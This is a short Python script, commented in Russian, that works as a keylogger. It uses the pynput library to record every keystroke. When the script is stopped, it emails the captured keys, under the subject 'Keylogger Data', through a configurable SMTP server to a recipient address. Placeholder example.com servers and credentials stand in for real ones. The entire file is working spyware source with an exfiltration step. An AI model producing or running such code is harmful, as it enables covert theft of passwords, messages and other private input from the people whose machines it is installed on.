import smtplib
from pynput import keyboard

# Замените следующие переменные своими данными
smtp_server = 'smtp.example.com'
smtp_port = 587
smtp_username = 'your_email@example.com'
smtp_password = 'your_email_password'
recipient_email = 'recipient@example.com'


key_history = []

def on_press(key):
    try:

        key_str = key.char
    except AttributeError:

        key_str = str(key)
    key_history.append(key_str)

def send_email(message):
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)

        subject = 'Keylogger Data'
        body = f'\n{message}'
        email_text = f'Subject: {subject}\n\n{body}'

        server.sendmail(smtp_username, recipient_email, email_text)
        server.quit()
    except Exception as e:
        print(f"Error sending email: {e}")
listener = keyboard.Listener(on_press=on_press)

listener.start()

try:
    listener.join()
except KeyboardInterrupt:
    send_email(''.join(key_history))
